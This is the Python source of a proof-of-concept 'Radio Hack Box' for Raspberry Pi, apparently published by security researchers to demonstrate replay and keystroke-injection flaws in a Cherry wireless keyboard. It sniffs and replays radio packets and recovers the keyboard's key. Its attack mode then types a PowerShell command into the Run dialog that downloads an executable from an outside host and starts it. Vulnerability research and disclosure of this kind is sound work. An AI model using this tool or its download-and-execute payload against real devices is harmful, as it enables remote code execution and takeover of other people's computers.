#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
  SySS Radio Hack Box v1.0

  by Matthias Deeg <matthias.deeg@syss.de> and
  Gerhard Klostermeier <gerhard.klostermeier@syss.de>

  Proof-of-Concept software tool to demonstrate the replay
  and keystroke injection vulnerabilities of the wireless keyboard
  Cherry B.Unlimited AES

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import logging
import RPi.GPIO as GPIO
import subprocess

from binascii import hexlify
from lib import keyboard
from lib import nrf24
from logging import debug, info
from RPLCD import CharLCD
from time import sleep, time
from sys import exit

# constants
APP_NAME        = u"Radio Hack Box"
SYSS_BANNER     = u"SySS GmbH - 2016"
ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"

RED_LED         = 3                         # red LED pin
GREEN_LED       = 5                         # green LED pin
BLUE_LED        = 7                         # blue LED pin
REPLAY_BUTTON   = 10                        # replay button pin
RECORD_BUTTON   = 11                        # record button pin
ATTACK_BUTTON   = 12                        # attack button pin
SCAN_BUTTON     = 13                        # scan button pin

IDLE            = 0                         # idle state
RECORD          = 1                         # record state
REPLAY          = 2                         # replay state
SCAN            = 3                         # scan state
ATTACK          = 4                         # attack state
SHUTDOWN        = 5                         # shutdown state

SCAN_TIME       = 2                         # scan time in seconds for scan mode heuristics
DWELL_TIME      = 0.1                       # dwell time for scan mode in seconds
PREFIX_ADDRESS  = ""                        # prefix address for promicious mode
LCD_DELAY       = 3                         # 3 seconds for showing some info on the LCD


class RadioHackBox():
    """Radio Hack Box"""

    def __init__(self):
        """Initialize the nRF24 radio and the Raspberry Pi"""

        self.state = IDLE                            # current state
        self.lcd = None                              # LCD
        self.radio = None                            # nRF24 radio
        self.address = None                          # address of Cherry keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
        self.channel = 6                             # used ShockBurst channel (was 6 for all tested Cherry keyboards)
        self.payloads = []                           # list of sniffed payloads
        self.kbd = None                              # keyboard for keystroke injection attacks

        try:
            # disable GPIO warnings
            GPIO.setwarnings(False)

            # initialize LCD
            self.lcd = CharLCD(cols=16, rows=2, pin_rs=15, pin_rw=18, pin_e=16, pins_data=[21, 22, 23, 24])
            self.lcd.clear()
            self.lcd.home()
            self.lcd.write_string(APP_NAME)
            self.lcd.cursor_pos = (1, 0)
            self.lcd.write_string(SYSS_BANNER)

            # use Raspberry Pi board pin numbers
            GPIO.setmode(GPIO.BOARD)

            # set up the GPIO pins
            GPIO.setup(RED_LED, GPIO.OUT, initial = GPIO.LOW)
            GPIO.setup(GREEN_LED, GPIO.OUT, initial = GPIO.LOW)
            GPIO.setup(BLUE_LED, GPIO.OUT, initial = GPIO.LOW)
            GPIO.setup(RECORD_BUTTON, GPIO.IN, pull_up_down = GPIO.PUD_DOWN)
            GPIO.setup(REPLAY_BUTTON, GPIO.IN, pull_up_down = GPIO.PUD_DOWN)
            GPIO.setup(ATTACK_BUTTON, GPIO.IN, pull_up_down = GPIO.PUD_DOWN)
            GPIO.setup(SCAN_BUTTON, GPIO.IN, pull_up_down = GPIO.PUD_DOWN)

            # set callcack functions
            GPIO.add_event_detect(RECORD_BUTTON, GPIO.RISING, callback = self.buttonCallback, bouncetime = 250)
            GPIO.add_event_detect(REPLAY_BUTTON, GPIO.RISING, callback = self.buttonCallback, bouncetime = 250)
            GPIO.add_event_detect(ATTACK_BUTTON, GPIO.RISING, callback = self.buttonCallback, bouncetime = 250)
            GPIO.add_event_detect(SCAN_BUTTON, GPIO.RISING, callback = self.buttonCallback, bouncetime = 250)

            # initialize radio
            self.radio = nrf24.nrf24()

            # enable LNA
            self.radio.enable_lna()

            # show startup info for some time with blinkenlights
            self.blinkenlights()

            # start scanning mode
            self.setState(SCAN)
        except:
            # error when initializing Radio Hack Box
            self.lcd.clear()
            self.lcd.home()
            self.lcd.write_string(u"Error: 0xDEAD")
            self.lcd.cursor_pos = (1, 0)
            self.lcd.write_string(u"Please RTFM!")


    def blinkenlights(self):
        """Blinkenlights"""

        for i in range(10):
            GPIO.output(RED_LED, GPIO.HIGH)
            GPIO.output(GREEN_LED, GPIO.HIGH)
            GPIO.output(BLUE_LED, GPIO.HIGH)
            sleep(0.1)
            GPIO.output(RED_LED, GPIO.LOW)
            GPIO.output(GREEN_LED, GPIO.LOW)
            GPIO.output(BLUE_LED, GPIO.LOW)
            sleep(0.1)


    def setState(self, newState):
        """Set state"""

        # set LCD content
        self.lcd.clear()
        self.lcd.home()
        self.lcd.write_string(APP_NAME)
        self.lcd.cursor_pos = (1, 0)

        if newState == RECORD:
            # set RECORD state
            self.state = RECORD

            # set LEDs
            GPIO.output(RED_LED, GPIO.HIGH)
            GPIO.output(GREEN_LED, GPIO.LOW)
            GPIO.output(BLUE_LED, GPIO.LOW)

            # set LCD content
            self.lcd.write_string(u"Recording ...")

        elif newState == REPLAY:
            # set REPLAY state
            self.state = REPLAY

            # set LEDs
            GPIO.output(RED_LED, GPIO.LOW)
            GPIO.output(GREEN_LED, GPIO.HIGH)
            GPIO.output(BLUE_LED, GPIO.LOW)

            # set LCD content
            self.lcd.write_string(u"Replaying ...")

        elif newState == SCAN:
            # set SCAN state
            self.state = SCAN

            # set LEDs
            GPIO.output(RED_LED, GPIO.LOW)
            GPIO.output(GREEN_LED, GPIO.LOW)
            GPIO.output(BLUE_LED, GPIO.HIGH)

            # set LCD content
            self.lcd.write_string(u"Scanning ...")

        elif newState == ATTACK:
            # set ATTACK state
            self.state = ATTACK

            # set LEDs
            GPIO.output(RED_LED, GPIO.LOW)
            GPIO.output(GREEN_LED, GPIO.HIGH)
            GPIO.output(BLUE_LED, GPIO.LOW)

            # set LCD content
            self.lcd.write_string(u"Attacking ...")

        elif newState == SHUTDOWN:
            # set SHUTDOWN state
            self.state = SHUTDOWN

            # set LEDs
            GPIO.output(RED_LED, GPIO.LOW)
            GPIO.output(GREEN_LED, GPIO.LOW)
            GPIO.output(BLUE_LED, GPIO.LOW)

            # set LCD content
            self.lcd.write_string(u"Shutdown ...")

        else:
            # set IDLE state
            self.state = IDLE

            # set LEDs
            GPIO.output(RED_LED, GPIO.LOW)
            GPIO.output(GREEN_LED, GPIO.LOW)
            GPIO.output(BLUE_LED, GPIO.LOW)

            # set LCD content
            self.lcd.write_string(SYSS_BANNER)


    def buttonCallback(self, channel):
        """Callback function for user input (pressed buttons)"""

        # record button state transitions
        if channel == RECORD_BUTTON:
            # if the current state is IDLE change it to RECORD
            if self.state == IDLE:
                # set RECORD state
                self.setState(RECORD)

                # empty payloads list
                self.payloads = []

            # if the current state is RECORD change it to IDLE
            elif self.state == RECORD:
                # set IDLE state
                self.setState(IDLE)

        # play button state transitions
        elif channel == REPLAY_BUTTON:
            # if the current state is IDLE change it to REPLAY
            if self.state == IDLE:
                # set REPLAY state
                self.setState(REPLAY)

        # scan button state transitions
        elif channel == SCAN_BUTTON:
            # wait a short a time to see whether the record button is also
            # press in order to perform a graceful shutdown

            # remove event detection for record button
            GPIO.remove_event_detect(RECORD_BUTTON)
            chan = GPIO.wait_for_edge(RECORD_BUTTON, GPIO.RISING, timeout=1000)
            if chan != None:
                # set SHUTDOWN state
                self.setState(SHUTDOWN)

            # set callback function for record button
            GPIO.remove_event_detect(RECORD_BUTTON)
            GPIO.add_event_detect(RECORD_BUTTON, GPIO.RISING, callback = self.buttonCallback, bouncetime = 250)

            # if the current state is IDLE change it to SCAN
            if self.state == IDLE:
                # set SCAN state
                self.setState(SCAN)

        # attack button state transitions
        elif channel == ATTACK_BUTTON:
            # if the current state is IDLE change it to ATTACK
            if self.state == IDLE:
                # set ATTACK state
                self.setState(ATTACK)

        # debug output
        debug("State: {0}".format(self.state))


    def unique_everseen(self, seq):
        """Remove duplicates from a list while preserving the item order"""
        seen = set()
        return [x for x in seq if str(x) not in seen and not seen.add(str(x))]


    def run(self):
        # main loop
        try:
            while True:
                if self.state == RECORD:
                    # info output
                    info("Start RECORD mode")

                    # receive payload
                    value = self.radio.receive_payload()

                    if value[0] == 0:
                        # split the payload from the status byte
                        payload = value[1:]

                        # add payload to list
                        self.payloads.append(payload)

                        # info output, show packet payload
                        info('Received payload: {0}'.format(hexlify(payload)))

                elif self.state == REPLAY:
                    # info output
                    info("Start REPLAY mode")

                    # remove duplicate payloads (retransmissions)
                    payloadList = self.unique_everseen(self.payloads)

                    # replay all payloads
                    for p in payloadList:
                        # transmit payload
                        self.radio.transmit_payload(p.tostring())

                        # info output
                        info('Sent payload: {0}'.format(hexlify(p)))


                    # set IDLE state after playback
                    sleep(0.5)                           # delay for LCD
                    self.setState(IDLE)

                elif self.state == SCAN:
                    # info output
                    info("Start SCAN mode")

                    # put the radio in promiscuous mode
                    self.radio.enter_promiscuous_mode(PREFIX_ADDRESS)

                    # define channels for scan mode
                    channels = [6]

                    # set initial channel
                    self.radio.set_channel(channels[0])

                    # sweep through the defined channels and decode ESB packets in pseudo-promiscuous mode
                    last_tune = time()
                    channel_index = 0
                    while True:
                        # increment the channel
                        if len(channels) > 1 and time() - last_tune > DWELL_TIME:
                            channel_index = (channel_index + 1) % (len(channels))
                            self.radio.set_channel(channels[channel_index])
                            last_tune = time()

                        # receive payloads
                        value = self.radio.receive_payload()
                        if len(value) >= 5:
                            # split the address and payload
                            address, payload = value[0:5], value[5:]

                            # convert address to string and reverse byte order
                            converted_address = address[::-1].tostring()

                            # check if the address most probably belongs to a Cherry keyboard
                            if ord(converted_address[0]) in range(0x31, 0x3f):
                                # first fit strategy to find a Cherry keyboard
                                self.address = converted_address
                                break

                    # set LCD content
                    self.lcd.clear()
                    self.lcd.home()
                    self.lcd.write_string("Found keyboard")
                    self.lcd.cursor_pos = (1, 0)
                    address_string = ':'.join('{:02X}'.format(b) for b in address)
                    self.lcd.write_string(address_string)

                    # info output
                    info("Found keyboard with address {0}".format(address_string))

                    # put the radio in sniffer mode (ESB w/o auto ACKs)
                    self.radio.enter_sniffer_mode(self.address)

                    last_key = 0
                    packet_count = 0
                    while True:
                        # receive payload
                        value = self.radio.receive_payload()

                        if value[0] == 0:
                            # do some time measurement
                            last_key = time()

                            # split the payload from the status byte
                            payload = value[1:]

                            # increment packet count
                            packet_count += 1

                            # show packet payload
                            info('Received payload: {0}'.format(hexlify(payload)))

                        # heuristic for having a valid release key data packet
                        if packet_count >= 4 and time() - last_key > SCAN_TIME:
                            break

                    self.radio.receive_payload()

                    # show info on LCD
                    self.lcd.cursor_pos = (1, 0)
                    self.lcd.write_string(u"Got crypto key!")

                    # info output
                    info('Got crypto key!')

                    # initialize keyboard
                    self.kbd = keyboard.CherryKeyboard(payload.tostring())
                    info('Initialize keyboard')

                    # set IDLE state after scanning
                    sleep(LCD_DELAY)                    # delay for LCD
                    self.setState(IDLE)

                elif self.state == ATTACK:
                    # info output
                    info("Start ATTACK mode")

                    if self.kbd != None:
#                        # send keystrokes for a classic PoC attack
#                        keystrokes = []
#                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
#                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
#                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
#                        keystrokes += self.kbd.getKeystrokes(u"cmd")
#                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
#                        keystrokes += self.kbd.getKeystrokes(u"rem All your base are belong to SySS!")
#                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

                        # send keystrokes for a classic download and execute PoC attack
                        keystrokes = []
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))

                        # send attack keystrokes
                        for k in keystrokes:
                            self.radio.transmit_payload(k)

                            # info output
                            info('Sent payload: {0}'.format(hexlify(k)))

                        # need small delay after WIN + R
                        sleep(0.1)

                        keystrokes = []
                        keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)

                        # send attack keystrokes with a small delay
                        for k in keystrokes:
                            self.radio.transmit_payload(k)

                            # info output
                            info('Sent payload: {0}'.format(hexlify(k)))

                    # set IDLE state after attack
                    sleep(0.5)                          # delay for LCD
                    self.setState(IDLE)

                elif self.state == SHUTDOWN:
                    # info output
                    info("SHUTDOWN")
                    sleep(0.5)

                    # perform graceful shutdown
                    command = "/usr/bin/sudo /sbin/shutdown -h now"
                    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
                    output = process.communicate()[0]

                    # show info on LCD
                    self.lcd.clear()
                    self.lcd.home()
                    self.lcd.write_string(APP_NAME)
                    self.lcd.cursor_pos = (1, 0)
                    self.lcd.write_string("3, 2, 1, gone.")

                    # clean GPIO pin settings
                    GPIO.cleanup()
                    exit(1)

        except KeyboardInterrupt:
            exit(1)
        finally:
            # clean up GPIO pin settings
            GPIO.cleanup()


# main program
if __name__ == '__main__':
    # setup logging
    level = logging.INFO
    logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

    # init
    radiohackbox = RadioHackBox()

    # run
    info("Start Radio Hack Box v1.0")
    radiohackbox.run()

